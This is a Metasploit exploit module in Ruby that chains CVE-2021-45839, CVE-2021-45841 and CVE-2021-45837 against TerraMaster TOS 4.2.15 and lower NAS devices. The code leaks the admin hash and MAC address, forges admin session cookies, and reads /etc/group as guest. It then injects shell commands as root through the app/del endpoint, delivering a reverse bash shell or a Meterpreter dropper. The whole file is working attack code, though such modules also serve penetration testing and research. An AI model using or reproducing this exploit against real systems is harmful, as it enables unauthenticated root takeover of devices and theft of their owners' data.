##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'digest/md5'
require 'time'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'TerraMaster TOS 4.2.15 or lower - RCE chain from unauthenticated to root via session crafting.',
        'Description' => %q{
          Terramaster chained exploit that performs session crafting to achieve escalated privileges that allows
          an attacker to access vulnerable code execution flaws. TOS versions 4.2.15 and below are affected.
          CVE-2021-45839 is exploited to obtain the first administrator's hash set up on the system as well as other
          information such as MAC address, by performing a request to the `/module/api.php?mobile/webNasIPS` endpoint.
          This information is used to craft an unauthenticated admin session using CVE-2021-45841 where an attacker
          can self-sign session cookies by knowing the target MAC address and the user password hash.
          Guest users (disabled by default) can be abused using a null/empty hash and allow an unauthenticated attacker
          to login as guest.
          Finally, CVE-2021-45837 is exploited to execute arbitrary commands as root by sending a specifically crafted
          input to vulnerable endpoint `/tos/index.php?app/del`.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # MSF module contributor
          'n0tme' # Discovery and POC
        ],
        'References' => [
          ['CVE', '2021-45837'],
          ['CVE', '2021-45839'],
          ['CVE', '2021-45841'],
          ['URL', 'https://thatsn0tmy.site/posts/2021/12/how-to-summon-rces/'],
          ['PACKETSTORM', '165399'],
          ['URL', 'https://attackerkb.com/topics/8rNXrrjQNy/cve-2021-45837']
        ],
        'DisclosureDate' => '2021-12-24',
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_X64, ARCH_X86, ARCH_AARCH64],
        'Privileged' => true,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_bash'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X64, ARCH_X86, ARCH_AARCH64],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => ['bourne', 'wget', 'curl'],
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 8181,
          'SSL' => false
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [true, 'Path to Terramaster Web console', '/'])
    ])
  end

  def get_data
    # Initialise instance variable data to store the leaked data
    @data = {}

    # Get the data by exploiting the LFI vulnerability through vulnerable endpoint `api.php?mobile/webNasIPS`.
    # CVE-2021-458439
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'module', 'api.php?mobile/webNasIPS'),
      'headers' => {
        'User-Agent' => 'TNAS',
        'User-Device' => 'TNAS'
      }
    })

    if res && res.code == 200 && res.body.include?('webNasIPS successful')
      # Parse the JSON response and get the data such as admin password hash and MAC address
      res_json = res.get_json_document
      unless res_json.blank?
        @data['password'] = res_json['data'].split('PWD:')[1].split("\n")[0].strip
        @data['mac'] = res_json['data'].split('mac":"')[1].split('"')[0].tr(':', '').strip
        @data['key'] = @data['mac'][6..11] # last three MAC address entries
        @data['timestamp'] = Time.new.to_i.to_s
        # derive signature
        @data['signature'] = tos_encrypt_str(@data['key'], @data['timestamp'])
      end
    end
  end

  def tos_encrypt_str(key, str_to_encrypt)
    id = key + str_to_encrypt
    return Digest::MD5.hexdigest(id.encode('utf-8'))
  end

  def get_headers
    {
      'User-Agent' => 'TNAS',
      'User-Device' => 'TNAS',
      'Authorization' => @data['password'],
      'Signature' => @data['signature'],
      'Timestamp' => @data['timestamp']
    }
  end

  def download_admin_users
    # Initialise instance variable admin_users to store the admin users from /etc/group
    @admin_users = []

    # Download /etc/group information to find all the admin users belonging to the group admin.
    # Using endpoint module/api.php?mobile/fileDownload as user guest allows to download the file without authentication.
    # CVE-2021-45841
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'module', 'api.php?mobile/fileDownload'),
      'ctype' => 'application/x-www-form-urlencoded',
      'cookie' => "kod_name=guest; kod_token=#{tos_encrypt_str(@data['key'], '')}",
      'headers' => get_headers,
      'vars_post' => {
        'path' => '/etc/group'
      }
    })
    # get the admin users from /etc/group
    if res && res.code == 200 && res.body.include?('admin')
      res.body.each_line do |line|
        next if line.empty?

        field = line.split(':')
        next unless field[0] == 'admin'

        @admin_users = field[3].strip.split(',')
        break
      end
    end
  end

  def get_session
    # Use session crafting to iterate thru the list of admin users to gain a session.
    # We will send two request per admin user. First request is a dummy request to obtain the session-id.
    # This session-id will be used to send the second request that will execute the echo command with marker.
    # if the response contains the marker, then the session has been successfully established.
    # CVE-2021-45837
    session = false
    marker = Rex::Text.rand_text_alphanumeric(8..16)
    for admin in @admin_users
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'tos', "index.php?app/del&id=0&name=;echo${IFS}#{marker};%23"),
        'ctype' => 'application/x-www-form-urlencoded',
        'keep_cookies' => true,
        'cookie' => "kod_name=#{admin}; kod_token=#{tos_encrypt_str(@data['key'], @data['password'])}",
        'headers' => get_headers
      })
      if res && res.code == 302 && !res.body.include?(marker.to_s)
        # Send second request to establish a session and break from the loop if true.
        res = send_request_cgi({
          'method' => 'GET',
          'uri' => normalize_uri(target_uri.path, 'tos', "index.php?app/del&id=0&name=;echo${IFS}#{marker};%23"),
          'ctype' => 'application/x-www-form-urlencoded',
          'keep_cookies' => true,
          'headers' => get_headers
        })
      end
      next unless res && res.code == 200 && res.body.include?(marker.to_s)

      session = true
      break
    end
    session
  end

  def get_terramaster_info
    # get Terramaster CPU architecture (X64 or ARM64) and TOS version
    @terramaster = {}
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'tos', 'index.php?user/login')
    })

    if res && res.body && res.code == 200
      # get the version information from the request response like below:
      # <link href="./static/style/bootstrap.css?ver=TOS3_A1.0_4.2.07" rel="stylesheet"/>
      return if res.body.match(/ver=.+?"/).nil?

      version = res.body.match(/ver=.+?"/)[0]
      # check if architecture is ARM64 or X64
      if version.match(/_A/)
        @terramaster['cpu_arch'] = 'ARM64'
      elsif version.match(/_S/) || version.match(/_Q/)
        @terramaster['cpu_arch'] = 'X64'
      else
        @terramaster['cpu_arch'] = 'UNKNOWN'
      end

      # strip TOS version number and remove trailing double quote.
      @terramaster['tos_version'] = version.split('.0_')[1].chop
    end
  end

  def execute_command(cmd, _opts = {})
    # Execute payload using vulnerable endpoint `index.php?app/del&id=0&name=;<PAYLOAD>;%23`
    # CVE-2021-45837
    payload = CGI.escape(cmd)
    send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'tos', "index.php?app/del&id=0&name=;#{payload};%23"),
      'ctype' => 'application/x-www-form-urlencoded',
      'keep_cookies' => true,
      'headers' => get_headers
    })
  end

  def check
    get_terramaster_info
    return CheckCode::Safe if @terramaster.empty?

    if Rex::Version.new(@terramaster['tos_version']) <= Rex::Version.new('4.2.15')
      return CheckCode::Vulnerable("TOS version is #{@terramaster['tos_version']} and CPU architecture is #{@terramaster['cpu_arch']}.")
    end

    CheckCode::Safe("TOS version is #{@terramaster['tos_version']} and CPU architecture is #{@terramaster['cpu_arch']}.")
  end

  def exploit
    # get the leaked data
    get_data
    fail_with(Failure::BadConfig, 'Can not retrieve the leaked data.') if @data.empty?

    download_admin_users
    fail_with(Failure::BadConfig, 'Can not retrieve the list of admin users.') if @admin_users.empty?

    fail_with(Failure::NoAccess, 'Can not establish an admin session.') unless get_session

    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      # Don't check the response here since the server won't respond
      # if the payload is successfully executed.
      execute_cmdstager(linemax: 65536)
    end
  end
end
